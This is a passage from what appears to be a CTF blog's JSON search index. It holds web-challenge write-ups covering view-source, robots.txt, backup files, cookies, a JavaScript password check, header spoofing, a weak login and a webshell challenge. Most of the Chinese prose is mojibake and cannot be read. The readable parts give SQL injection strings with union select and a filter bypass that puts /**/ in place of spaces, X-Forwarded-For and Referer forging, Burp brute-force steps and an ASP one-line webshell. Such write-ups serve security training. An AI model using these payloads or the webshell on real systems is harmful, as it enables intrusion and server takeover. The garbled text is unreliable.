table_name=0x68316464656e5f66313467 # //è¿™é‡Œæœ‰ä¸€ç‚¹å°±æ˜¯åœ¨é€—å·è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹è¿™é‡Œè½¬ä¹‰ä¼šå¯¼è‡´sqlæŸ¥è¯¢å‡ºé”™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†è¡¨åè¿›è¡ŒASCIIçš„å…«è¿›åˆ¶ç¼–ç ï¼Œå‰é¢åŠ ä¸Š0xï¼Œå°±å¯ä»¥åœ¨sqlä¸­æ­£å¸¸æŸ¥è¯¢è¿”å›the_f14g 1name=admin \\' union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4 # å¾—åˆ°flagã€‚ login as admin 1æŸ¥çœ‹æºç ï¼Œå‘ç°å’Œ login as admin 0å·®ä¸å¤šï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼›ç”¨/**/ ä»£æ›¿ç©ºæ ¼ 1user=admin\\'union/**/select/**/1,2,3,4# å¾—åˆ°flagã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"hackme","slug":"CTF/hackme","permalink":"https://singlemindedt.github.io/categories/CTF/hackme/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"},{"name":"Misc","slug":"Misc","permalink":"https://singlemindedt.github.io/tags/Misc/"}]},{"title":"æ”»é˜²ä¸–ç•Œ-Web","slug":"æ”»é˜²ä¸–ç•Œ-Web","date":"2019-12-25T14:49:02.000Z","updated":"2019-12-30T09:41:06.814Z","comments":true,"path":"2019/12/25/æ”»é˜²ä¸–ç•Œ-Web/","link":"","permalink":"https://singlemindedt.github.io/2019/12/25/æ”»é˜²ä¸–ç•Œ-Web/","excerpt":"","text":"ç›®å½• [TOC] æ”»é˜²ä¸–ç•Œæ–°æ‰‹ç»ƒä¹ åŒºview_sourceé¢˜ç›®æè¿°ï¼šXè€å¸ˆè®©å°å®åŒå­¦æŸ¥çœ‹ä¸€ä¸ªç½‘é¡µçš„æºä»£ç ï¼Œä½†å°å®åŒå­¦å‘ç°é¼ æ ‡å³é”®å¥½åƒä¸ç®¡ç”¨äº†ã€‚æ‰“å¼€é“¾æ¥å¦‚ä¸‹ï¼š æ–¹æ³•1è¯•è¯•å³é”®çš„ç¡®ä¸ç®¡ç”¨äº†ï¼Œç›´æ¥F12ï¼Œæ‰¾åˆ°flag æ–¹æ³•2å¦å¤–è¿˜å¯ä»¥é€šè¿‡view-sourceï¼šurlæŸ¥çœ‹æºä»£ç ï¼š æ–¹æ³•3å…¶å®è¿˜å¯ä»¥ç¦ç”¨Jsä»£ç ï¼Œè¿™æ ·å³é”®å°±å¯ä»¥ç”¨äº†ï¼š get_posté¢˜ç›®æè¿°ï¼šXè€å¸ˆå‘Šè¯‰å°å®åŒå­¦HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•ï¼Œä½ çŸ¥é“æ˜¯å“ªä¸¤ç§å—ï¼Ÿ çŸ¥è¯†è¡¥å……ï¼šä¸¤ç§ HTTP è¯·æ±‚æ–¹æ³•ï¼šGET å’Œ POSTåœ¨å®¢æˆ·æœºå’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œè¯·æ±‚-å“åº”æ—¶ï¼Œä¸¤ç§æœ€å¸¸è¢«ç”¨åˆ°çš„æ–¹æ³•æ˜¯ï¼šGET å’Œ 12345POSTã€‚&#123;GET - ä»æŒ‡å®šçš„èµ„æºè¯·æ±‚æ•°æ®ã€‚POST - å‘æŒ‡å®šçš„èµ„æºæäº¤è¦è¢«å¤„ç†çš„æ•°æ®&#125; https://www.w3school.com.cn/tags/html_ref_httpmethods.asp https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc å®é™…æ“ä½œï¼šæ‰“å¼€ç½‘å€ï¼Œå¾—åˆ°å¦‚ä¸‹è¦æ±‚ &lt;ç”¨GETç»™åç«¯ä¼ å‚çš„æ–¹æ³•æ˜¯ï¼šåœ¨?åè·Ÿå˜é‡åå­—ï¼Œä¸åŒçš„å˜é‡ä¹‹é—´ç”¨&amp;éš”å¼€&gt;åœ¨urlåæ·»åŠ /ï¼Ÿa=1å³å¯å‘é€getè¯·æ±‚ã€‚ åˆ©ç”¨hackbarè¿›è¡ŒPOSTä¼ å‚ï¼šå¤åˆ¶getçš„urlï¼Œé€‰æ‹©postdataï¼Œå¡«å…¥b=2ï¼Œé€‰æ‹©executeã€‚å³å¯å‘é€POSTè¯·æ±‚ã€‚ å…³äºGET å’Œ POSTï¼šhttps://www.cnblogs.com/williamjie/p/9099940.html Robotsé¢˜ç›®æè¿°ï¼šXè€å¸ˆä¸Šè¯¾è®²äº†Robotsåè®®ï¼Œå°å®åŒå­¦å´ä¸Šè¯¾æ‰“äº†çŒç¡ï¼Œèµ¶ç´§æ¥æ•™æ•™å°å®Robotsåè®®æ˜¯ä»€ä¹ˆå§ã€‚ çŸ¥è¯†è¡¥å……ï¼š robots.txtæ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚ å½“ä¸€ä¸ªæœç´¢èœ˜è››è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€æœ‰çš„æœç´¢èœ˜è››å°†èƒ½å¤Ÿè®¿é—®ç½‘ç«™ä¸Šæ‰€æœ‰æ²¡æœ‰è¢«å£ä»¤ä¿æŠ¤çš„é¡µé¢ã€‚ç™¾åº¦å®˜æ–¹å»ºè®®ï¼Œä»…å½“æ‚¨çš„ç½‘ç«™åŒ…å«ä¸å¸Œæœ›è¢«æœç´¢å¼•æ“æ”¶å½•çš„å†…å®¹æ—¶ï¼Œæ‰éœ€è¦ä½¿ç”¨robots.txtæ–‡ä»¶ã€‚å¦‚æœæ‚¨å¸Œæœ›æœç´¢å¼•æ“æ”¶å½•ç½‘ç«™ä¸Šæ‰€æœ‰å†…å®¹ï¼Œè¯·å‹¿å»ºç«‹robots.txtæ–‡ä»¶ã€‚ å¦‚æœå°†ç½‘ç«™è§†ä¸ºé…’åº—é‡Œçš„ä¸€ä¸ªæˆ¿é—´ï¼Œrobots.txtå°±æ˜¯ä¸»äººåœ¨æˆ¿é—´é—¨å£æ‚¬æŒ‚çš„â€œè¯·å‹¿æ‰“æ‰°â€æˆ–â€œæ¬¢è¿æ‰“æ‰«â€çš„æç¤ºç‰Œã€‚è¿™ä¸ªæ–‡ä»¶å‘Šè¯‰æ¥è®¿çš„æœç´¢å¼•æ“å“ªäº›æˆ¿é—´å¯ä»¥è¿›å…¥å’Œå‚è§‚ï¼Œå“ªäº›æˆ¿é—´å› ä¸ºå­˜æ”¾è´µé‡ç‰©å“ï¼Œæˆ–å¯èƒ½æ¶‰åŠä½æˆ·åŠè®¿å®¢çš„éšç§è€Œä¸å¯¹æœç´¢å¼•æ“å¼€æ”¾ã€‚ä½†robots.txtä¸æ˜¯å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯é˜²ç«å¢™ï¼Œå¦‚åŒå®ˆé—¨äººæ— æ³•é˜»æ­¢çªƒè´¼ç­‰æ¶æ„é—¯å…¥è€…ã€‚ Robotsåè®®ç”¨æ¥å‘ŠçŸ¥æœç´¢å¼•æ“å“ªäº›é¡µé¢èƒ½è¢«æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½è¢«æŠ“å–ï¼›å¯ä»¥å±è”½ä¸€äº›ç½‘ç«™ä¸­æ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œå¦‚ï¼šå›¾ç‰‡ï¼ŒéŸ³ä¹ï¼Œè§†é¢‘ç­‰ï¼ŒèŠ‚çœæœåŠ¡å™¨å¸¦å®½ï¼›å¯ä»¥å±è”½ç«™ç‚¹çš„ä¸€äº›æ­»é“¾æ¥ã€‚æ–¹ä¾¿æœç´¢å¼•æ“æŠ“å–ç½‘ç«™å†…å®¹ï¼›è®¾ç½®ç½‘ç«™åœ°å›¾è¿æ¥ï¼Œæ–¹ä¾¿å¼•å¯¼èœ˜è››çˆ¬å–é¡µé¢ã€‚ã€https://blog.csdn.net/qq_40491569/article/details/83473703ã€‘ å®é™…æ“ä½œï¼šæ‰“å¼€ç½‘é¡µç©ºç™½ï¼› åœ¨é¢˜URLåè¾“å…¥/robots.txtå³ï¼š http://111.198.29.45:35567/robots.txt f1ag_1s_h3re.phpè¿™ä¸ªé¡µé¢ä¸å…è®¸è¢«çˆ¬å–ï¼ŒæŸ¥çœ‹ä¸€ä¸‹f1ag_1s_h3re.phpé¡µé¢å¾—åˆ°flag. Backupé¢˜ç›®æè¿°ï¼šXè€å¸ˆå¿˜è®°åˆ é™¤å¤‡ä»½æ–‡ä»¶ï¼Œä»–æ´¾å°å®åŒå­¦å»æŠŠå¤‡ä»½æ–‡ä»¶æ‰¾å‡ºæ¥,ä¸€èµ·æ¥å¸®å°å®åŒå­¦å§ï¼ çŸ¥è¯†è¡¥å……å¤‡ä»½æ–‡ä»¶: bakï¼ˆè¢«è‡ªåŠ¨æˆ–æ˜¯é€šè¿‡å‘½ä»¤åˆ›å»ºçš„è¾…åŠ©æ–‡ä»¶ï¼Œå®ƒåŒ…å«æŸä¸ªæ–‡ä»¶çš„æœ€è¿‘ä¸€ä¸ªç‰ˆæœ¬ï¼‰ å®é™…æ“ä½œè¯•ç€åœ¨index.phpååŠ .bakå¾—åˆ°index.php.bakçš„å¤‡ä»½æ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°flag CookieçŸ¥è¯†è¡¥å……ï¼š Cookie å¯ä»¥ç¿»è¯‘ä¸ºâ€œå°ç”œå“ï¼Œå°é¥¼å¹²â€ï¼ŒCookie åœ¨ç½‘ç»œç³»ç»Ÿä¸­å‡ ä¹æ— å¤„ä¸åœ¨ï¼Œå½“æˆ‘ä»¬æµè§ˆä»¥å‰è®¿é—®è¿‡çš„ç½‘ç«™æ—¶ï¼Œç½‘é¡µä¸­å¯èƒ½ä¼šå‡ºç° ï¼šä½ å¥½ XXXï¼Œè¿™ä¼šè®©æˆ‘ä»¬æ„Ÿè§‰å¾ˆäº²åˆ‡ï¼Œå°±å¥½åƒåƒäº†ä¸€ä¸ªå°ç”œå“ä¸€æ ·ã€‚è¿™å…¶å®æ˜¯é€šè¿‡è®¿é—®ä¸»æœºä¸­çš„ä¸€ä¸ªæ–‡ä»¶æ¥å®ç°çš„ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯ Cookieã€‚åœ¨ Internet ä¸­ï¼ŒCookie å®é™…ä¸Šæ˜¯æŒ‡å°é‡ä¿¡æ¯ï¼Œæ˜¯ç”±WebæœåŠ¡å™¨åˆ›å»ºçš„ï¼Œå°†ä¿¡æ¯å­˜å‚¨åœ¨ç”¨æˆ·è®¡ç®—æœºä¸Šçš„æ–‡ä»¶ã€‚ä¸€èˆ¬ç½‘ç»œç”¨æˆ·ä¹ æƒ¯ç”¨å…¶å¤æ•°å½¢å¼ Cookiesï¼ŒæŒ‡æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ã€è¿›è¡ŒSession è·Ÿè¸ªè€Œå­˜å‚¨åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼Œè€Œè¿™äº›æ•°æ®é€šå¸¸ä¼šç»è¿‡åŠ å¯†å¤„ç†ã€‚å…¶å®cookiesæ˜¯ç”±ç½‘ç»œæœåŠ¡å™¨å­˜å‚¨åœ¨ä½ ç”µè„‘ç¡¬ç›˜ä¸Šçš„ä¸€ä¸ªtxtç±»å‹çš„å°æ–‡ä»¶ï¼Œå®ƒå’Œä½ çš„ç½‘ç»œæµè§ˆè¡Œä¸ºæœ‰å…³ï¼Œæ‰€ä»¥å­˜å‚¨åœ¨ä½ ç”µè„‘ä¸Šçš„cookieså°±å¥½åƒä½ çš„ä¸€å¼ èº«ä»½è¯ï¼Œä½ ç”µè„‘ä¸Šçš„cookieså’Œå…¶ä»–ç”µè„‘ä¸Šçš„cookiesæ˜¯ä¸ä¸€æ ·çš„;cookiesä¸èƒ½è¢«è§†ä½œä»£ç æ‰§è¡Œï¼Œä¹Ÿä¸èƒ½æˆä¸ºç—…æ¯’ï¼Œæ‰€ä»¥å®ƒå¯¹ä½ åŸºæœ¬æ— å®³ã€‚cookiesçš„ä½œç”¨ä¸»è¦æ˜¯ï¼Œå½“ä½ è®¿é—®äº†æŸäº›ç½‘é¡µï¼Œå¹¶ä¸”å¯¹ç½‘é¡µçš„ä¸€äº›è®¾ç½®è¿›è¡Œä¿®æ”¹ï¼Œcookieså°±èƒ½è·Ÿè¸ªå¹¶è®°å½•åˆ°è¿™äº›ä¿®æ”¹ï¼Œå½“ä½ ä¸‹ä¸€æ¬¡è®¿é—®è¿™ä¸ªç½‘é¡µçš„æ—¶å€™ï¼Œè¿™ä¸ªç½‘é¡µä¼šåˆ†æä½ ç”µè„‘ä¸Šçš„cookiesï¼Œè¿›è€Œé‡‡å–æªæ–½åƒä½ è¿”å›æ›´ç¬¦åˆä½ ä¸ªæ€§åŒ–çš„ç½‘é¡µ; å½“ç„¶ï¼Œç›®å‰å¤§éƒ¨åˆ†å¹¿å‘Šçš„å®šä½åŸºç¡€ä¹Ÿæ˜¯åŸºäºcookiesçš„ï¼Œæ¯”å¦‚ä½ æ­¤å‰è®¿é—®äº†å¤§é‡çš„å¥èº«ç±»ç½‘ç«™ï¼Œcookiesè®°å½•äº†ä½ çš„è®¿é—®è¡Œä¸ºï¼Œå¹¿å‘Šä¸»å°±èƒ½å¤Ÿæ ¹æ®ä½ çš„è®¿é—®è¡Œä¸ºï¼Œå‘ä½ æ¨é€å¥èº«ç±»çš„å¹¿å‘Šã€‚ å®é™…æ“ä½œï¼šåˆ©ç”¨å¼€å‘è€…å·¥å…·F12é”®â€”ç½‘ç»œï¼ŒæŸ¥çœ‹æ¶ˆæ¯å¤´çœ‹åˆ°â€œCookie look-here=cookie.phpâ€ æ ¹æ®æç¤ºä¿¡æ¯ï¼Œåœ¨URLååŠ ä¸Šâ€/cookie.phpâ€å³http://111.198.29.45:47420/cookie.php æç¤ºæŸ¥çœ‹HTTPå“åº”ï¼Œåœ¨æ¶ˆæ¯å¤´é‡Œå‘ç°flagã€‚ disabled_buttoné¢˜ç›®æè¿°ï¼šXè€å¸ˆä»Šå¤©ä¸Šè¯¾è®²äº†å‰ç«¯çŸ¥è¯†ï¼Œç„¶åç»™äº†å¤§å®¶ä¸€ä¸ªä¸èƒ½æŒ‰çš„æŒ‰é’®ï¼Œå°å®æƒŠå¥‡åœ°å‘ç°è¿™ä¸ªæŒ‰é’®æŒ‰ä¸ä¸‹å»ï¼Œåˆ°åº•æ€ä¹ˆæ‰èƒ½æŒ‰ä¸‹å»å‘¢ï¼Ÿ çŸ¥è¯†è¡¥å……ï¼šéœ€è¦ç†Ÿæ‚‰ä¸€äº›å¸¸è§çš„HTMLçŸ¥è¯† å®é™…æ“ä½œï¼šå³é”®-&gt;æŸ¥çœ‹å…ƒç´ ï¼Œåœ¨inputä¸­ç”¨äº†â€˜disabled=â€ â€œâ€™å±æ€§ï¼ŒåŒå‡»ï¼Œå°†å…¶åˆ æ‰ï¼ŒæŒ‰é’®ä¾¿å¯æ­£å¸¸ä½¿ç”¨ã€‚ simple_jsé¢˜ç›®æè¿°ï¼š å°å®å‘ç°äº†ä¸€ä¸ªç½‘é¡µï¼Œä½†å´ä¸€ç›´è¾“ä¸å¯¹å¯†ç ã€‚(Flagæ ¼å¼ä¸º Cyberpeace{xxxxxxxxx} ) å®é™…æ“ä½œï¼šæ‰“å¼€é“¾æ¥ç©ºç™½ï¼ŒæŸ¥çœ‹æºç ï¼Œæœ‰å¦‚ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031function dechiffre(pass_enc) &#123; var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(','); var i, j, k, l = 0, m, n, o, p = \"\"; i = 0; j = tab.length; k = j + (l) + (n = 0); n = tab2.length; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; p += String.fromCharCode((o = tab2[i])); if (i == 5) break; &#125; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; if (i &gt; 5 &amp;&amp; i &lt; k - 1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p; return pass;&#125;String[\"fromCharCode\"](dechiffre( \"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"));h = window.prompt('Enter password');alert(dechiffre(h)); è¿™ä¸€é•¿ä¸²16è¿›åˆ¶æ•°å¾ˆå¯ç–‘ï¼Œ 1\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" è½¬å­—ç¬¦å¾—åˆ°ï¼š55,56,54,79,115,69,114,116,107,49,50å†å°†å…¶è½¬æ¢ä¸º10è¿›åˆ¶ASCIIç å¯¹åº”çš„å­—ç¬¦å¾—åˆ° ï¼š786OsErtk12åŠ ä¸Šé¢˜ç›®ç»™å‡ºçš„æ ¼å¼å¾—åˆ°flagï¼ˆè§£ç å‡½æ•°ä¼¼ä¹ä¸èƒ½å¾—åˆ°æ­£ç¡®å¯†ç //orzï¼Ÿï¼‰ xff_refereré¢˜ç›®æè¿°ï¼šXè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚ å®é™…æ“ä½œï¼šæ‰“å¼€é“¾æ¥å¦‚å›¾ï¼š çŸ¥è¯†è¡¥å……X-Forwarded-Forå’ŒRefererXFFæ„é€ æ¥æºIPRefereræ„é€ æ¥æºæµè§ˆå™¨ X-Forwarded-For:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨åŸºæ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†åˆ©ç”¨bpæŠ“åŒ…ï¼š åœ¨HTTPå¤´æ·»åŠ ï¼šX-Forwarded-For:123.123.123.123 å¾—åˆ°ä¸‹å›¾æç¤ºï¼š å†åŠ ä¸€æ¡Referer:https://www.google.com å¾—åˆ°flagã€‚ 1:(/images/7.5.png)ç”±äºæ¯æ¬¡æ·»åŠ éƒ½è¦é‡æ–°è¾“å…¥ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨RepeateråŠŸèƒ½ï¼š å¾—åˆ°ï¼š å¯ä»¥åœ¨å·¦è¾¹ç›´æ¥ç¼–è¾‘Requestâ€”&gt;å³ä¾§å¾—åˆ°Responseï¼š Responseâ€”&gt;Flag! è‡ªå·±ç¼–è¾‘çš„æ—¶å€™æ³¨æ„Targetçš„æ ¼å¼ï¼š å»æ‰è¯·æ±‚åè®®http:// ç›¸å…³çŸ¥è¯†URLä¸URIï¼šhttps://blog.csdn.net/lslk9898/article/details/86490383 weak_authé¢˜ç›®æè¿°ï¼šå°å®å†™äº†ä¸€ä¸ªç™»é™†éªŒè¯é¡µé¢ï¼Œéšæ‰‹å°±è®¾äº†ä¸€ä¸ªå¯†ç ã€‚ å®é™…æ“ä½œæ ¹æ®å¼¹çª—çš„æç¤ºï¼Œç”¨æˆ·åå¿…é¡»æ˜¯admin å°†usenameè®¾ç½®ä¸ºadminï¼Œéšæ‰‹ï¼ï¼ï¼çœŸçš„æ˜¯éšæ‰‹ï¼Œè¾“äº†ä¸ª123456ï¼Œç»“æœå¯¹äº†hhh :) æ­£å¸¸è§£æ³• ç”¨Burp Suiteå¯¹å®ƒè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œ å¯ä»¥å…ˆè¯•ç€è¾“å…¥username=adminå’Œpassword=11111,ä»¥ç¡®å®šçˆ†ç ´ä½ç½®ã€‚ Actionâ€”&gt;send to Intruder åŸºæœ¬é…ç½®ï¼š1ã€åœ¨æ¶ˆæ¯ç¼–è¾‘å™¨çš„ä¸Šæ–¹ï¼Œæœ‰ä¸€ä¸ªä¸‹æ‹‰é€‰æ‹©æ¡†ï¼Œæ”»å‡»ç±»å‹ï¼ˆAttack Typeï¼‰ï¼Œå‡ ç§ä¸åŒçš„æ–¹å¼ï¼Œè¿™é‡Œé€‰æ‹©ï¼šé›†æŸç‚¸å¼¹æ¨¡å¼ï¼ˆCluster bombï¼‰ å®ƒå¯ä»¥ä½¿ç”¨å¤šç»„Payloadé›†åˆï¼Œåœ¨æ¯ä¸€ä¸ªä¸åŒçš„Payloadæ ‡å¿—ä½ç½®ä¸Šï¼ˆæœ€å¤š20ä¸ªï¼‰ï¼Œä¾æ¬¡éå†æ‰€æœ‰çš„Payloadã€‚å®ƒä¸è‰å‰æ¨¡å¼çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œæ‰§è¡Œçš„Payloadæ•°æ®Payloadç»„çš„ä¹˜ç§¯ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªPayloadæ ‡å¿—ä½ç½®ï¼Œç¬¬ä¸€ä¸ªPayloadå€¼ä¸ºAå’ŒBï¼Œç¬¬äºŒä¸ªPayloadå€¼ä¸ºCå’ŒDï¼Œåˆ™å‘èµ·æ”»å‡»æ—¶ï¼Œå°†å…±å‘èµ·å››æ¬¡æ”»å‡»ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’ŒCï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’ŒDï¼Œç¬¬ä¸‰æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’ŒCï¼Œç¬¬å››æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’ŒDã€‚ 2ã€ç”±äºusernameè§„å®šç”¨adminï¼› ç®€å•åˆ—è¡¨ï¼ˆSimple listï¼‰ â€”â€”æœ€ç®€å•çš„Payloadç±»å‹ï¼Œé€šè¿‡é…ç½®ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ä½œä¸ºPayloadï¼Œä¹Ÿå¯ä»¥æ‰‹å·¥æ·»åŠ å­—ç¬¦ä¸²åˆ—è¡¨æˆ–ä»æ–‡ä»¶åŠ è½½å­—ç¬¦ä¸²åˆ—è¡¨ã€‚å…¶è®¾ç½®ç•Œé¢å¦‚ä¸‹å›¾ 3ã€å¯¼å…¥å¯†ç list 4ã€å¯é€‰é¡¹è®¾ç½®ï¼ˆOptionsï¼‰å¯é€‰é¡¹è®¾ç½®ä¸»è¦åŒ…æ‹¬è¯·æ±‚æ¶ˆæ¯å¤´è®¾ç½®ã€è¯·æ±‚å¼•æ“è®¾ç½®ã€æ”»å‡»ç»“æœè®¾ç½®ã€grep match, grep extract, grep payloads,ä»¥åŠé‡å®šå‘è®¾ç½®ã€‚åœ¨ä½¿ç”¨ä¸­ï¼Œä½ å¯ä»¥åœ¨æ”»å‡»å‰è¿›è¡Œè®¾ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨æ”»å‡»è¿‡ç¨‹ä¸­åšè¿™äº›é€‰é¡¹çš„è°ƒæ•´ã€‚ å¼€å§‹çˆ†ç ´ï¼š å¯ä»¥æ˜æ˜¾çœ‹åˆ°å‡ºç°äº†é•¿åº¦ä¸ä¸€æ ·çš„å“åº”ï¼Œ123456åº”è¯¥å°±æ˜¯æ­£ç¡®å¯†ç ï¼ŒæŸ¥çœ‹Responseå¾—åˆ°Flagã€‚ webshellé¢˜ç›®æè¿°ï¼šå°å®ç™¾åº¦äº†phpä¸€å¥è¯,è§‰ç€å¾ˆæœ‰æ„æ€,å¹¶ä¸”æŠŠå®ƒæ”¾åœ¨index.phpé‡Œã€‚ çŸ¥è¯†è¡¥å……ï¼š webshellå°±æ˜¯ä»¥aspã€phpã€jspæˆ–è€…cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚é»‘å®¢åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†aspæˆ–phpåé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨WEBç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®aspæˆ–è€…phpåé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚ é¡¾åæ€ä¹‰ï¼Œâ€œwebâ€çš„å«ä¹‰æ˜¯æ˜¾ç„¶éœ€è¦æœåŠ¡å™¨å¼€æ”¾webæœåŠ¡ï¼Œâ€œshellâ€çš„å«ä¹‰æ˜¯å–å¾—å¯¹æœåŠ¡å™¨æŸç§ç¨‹åº¦ä¸Šæ“ä½œæƒé™ã€‚webshellå¸¸å¸¸è¢«ç§°ä¸ºå…¥ä¾µè€…é€šè¿‡ç½‘ç«™ç«¯å£å¯¹ç½‘ç«™æœåŠ¡å™¨çš„æŸç§ç¨‹åº¦ä¸Šæ“ä½œçš„æƒé™ã€‚ç”±äºwebshellå…¶å¤§å¤šæ˜¯ä»¥åŠ¨æ€è„šæœ¬çš„å½¢å¼å‡ºç°ï¼Œä¹Ÿæœ‰äººç§°ä¹‹ä¸ºç½‘ç«™çš„åé—¨å·¥å…·ã€‚ ä¸Šä¼ æœ¨é©¬æ‹¿webshellçš„æ–¹æ³•æ±‡æ€» å›¾ç‰‡ç»™å‡ºçš„ä»£ç ä¸ºphpä¸€å¥è¯æœ¨é©¬ï¼šä¸€å¥è¯æœ¨é©¬çš„å·¥ä½œåŸç†ï¼šä¸€å¥è¯æœ¨é©¬åˆ†ææœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ã€‚ â€œä¸€å¥è¯æœ¨é©¬â€æœåŠ¡ç«¯ï¼ˆæ˜¯ç”¨äºæœ¬åœ°çš„htmlæäº¤è„šæœ¬æœ¨é©¬æ–‡ä»¶ï¼‰ å°±æ˜¯æˆ‘ä»¬è¦ç”¨æ¥æ’å…¥åˆ°aspæ–‡ä»¶ä¸­çš„aspè¯­å¥ï¼Œï¼ˆä¸ä»…ä»…æ˜¯ä»¥aspä¸ºåç¼€çš„æ•°æ®åº“æ–‡ä»¶ï¼‰ï¼Œè¯¥è¯­å¥å°†å›ä¸ºè§¦å‘ï¼Œæ¥æ”¶å…¥ä¾µè€…é€šè¿‡å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œæ‰§è¡Œå¹¶å®Œæˆç›¸åº”çš„æ“ä½œï¼ŒæœåŠ¡ç«¯çš„ä»£ç å†…å®¹ä¸º &lt;%execute request(â€œvalueâ€)%&gt; å…¶ä¸­valueå¯ä»¥è‡ªå·±ä¿®æ”¹â€œä¸€å¥è¯æœ¨é©¬â€å®¢æˆ·ç«¯ï¼ˆè¿œç¨‹æœåŠ¡å™¨ä¸Šè¢«æ’å…¥ä¸€å¥è¯çš„aspå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ 